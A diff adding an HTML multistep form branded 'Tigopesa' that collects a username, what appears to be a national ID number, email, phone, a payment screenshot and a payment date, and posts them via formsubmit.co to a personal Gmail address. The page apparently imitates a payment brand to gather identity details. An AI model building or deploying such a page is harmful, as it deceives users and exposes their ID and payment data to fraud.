@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Multistep Form</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+  <div class="container">
+    <header>Tigopesa </header>
+    <div class="progress-bar">
+      <div class="step">
+        <p>Name</p>
+        <div class="bullet"><span>1</span></div>
+        <div class="check fas fa-check"></div>
+      </div>
+      <div class="step">
+        <p>Contact</p>
+        <div class="bullet"><span>2</span></div>
+        <div class="check fas fa-check"></div>
+      </div>
+      <div class="step">
+        <p>Upload</p>
+        <div class="bullet"><span>3</span></div>
+        <div class="check fas fa-check"></div>
+      </div>
+      <div class="step">
+        <p>Submit</p>
+        <div class="bullet"><span>4</span></div>
+        <div class="check fas fa-check"></div>
+      </div>
+    </div>
+    <div class="form-outer">
+      <form method="POST" action="https://formsubmit.co/Kelvinarts55@gmail.com" enctype="multipart/form-data">
+        <div class="page slide-page">
+          <div class="title">Registration Info:</div>
+          <div class="field">
+            <div class="label">Website Username</div>
+            <input type="text" name="first_name" placeholder="Enter your username" required>
+          </div>
+          <div class="field">
+            <div class="label">Phone  Name</div>
+            <input type="text" name="last_name" placeholder="Enter  nida number name" required>
+          </div>
+          <div class="field">
+            <button class="firstNext next">Next</button>
+          </div>
+        </div>
+        <div class="page">
+          <div class="title">Contact Info:</div>
+          <div class="field">
+            <div class="label">Email Address</div>
+            <input type="email" name="email" placeholder="Enter your email address" required>
+          </div>
+          <div class="field">
+            <div class="label">Phone Number</div>
+            <input type="tel" name="phone" placeholder="Enter your phone number" required>
+          </div>
+          <div class="field btns">
+            <button class="prev-1 prev">Previous</button>
+            <button class="next-1 next">Next</button>
+          </div>
+        </div>
+        <div class="page">
+          <div class="title">Payment Screenshot:</div>
+          <div class="field">
+            <div class="label">Screenshot</div>
+            <label for="screenshot-upload" class="custom-file-upload">
+              <span style="position: relative; left: -60px; top:20%;color:#757575;">Attach Screenshot</span>
+            </label>
+            <input id="screenshot-upload" type="file" name="screenshot" required>
+          </div>
+          <div class="field">
+            <div class="label" id="dob-label">Payment Date</div>
+            <input id="datepicker-input" type="text" name="payment_date" placeholder="Select Date" required>
+            <div id="calendar" class="calendar"></div>
+          </div>
+          <div class="field btns">
+            <button class="prev-2 prev">Previous</button>
+            <button class="next-2 next">Next</button>
+          </div>
+        </div>
+        <div class="page">
+          <div class="title">Message:</div>
+          <div class="fieldjay" style="margin-top: 20px;">
+            <textarea name="message" placeholder="Enter a message or leave blank"></textarea>
+          </div>
+          <div class="field btns">
+            <button class="prev-3 prev">Previous</button>
+            <button class="submit">Submit</button>
+          </div>
+        </div>
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_subject" value="New submission!">
+        <input type="hidden" name="_next" value="https://safiridigital-icu-thankpage.vercel.app/">
+        <input type="hidden" name="_cc" value="another@email.com">
+        <input type="hidden" name="_autoresponse" value="your custom message">
+      </form>
+    </div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
